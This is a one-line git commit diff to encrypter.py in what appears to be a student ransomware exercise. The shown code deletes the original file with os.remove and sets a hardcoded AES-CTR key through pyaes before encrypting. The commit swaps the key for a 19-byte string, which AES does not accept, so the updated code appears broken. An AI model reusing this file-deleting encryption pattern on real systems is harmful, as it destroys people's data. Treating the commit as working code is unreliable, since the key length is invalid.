5522fa069b616d23eb8e224fef0d5702c7056f78
MariborgesDEV <114106150+MariborgesDEV@users.noreply.github.com>
2023-06-16 19:40:24 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -11,7 +11,7 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"testecodigoransower"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
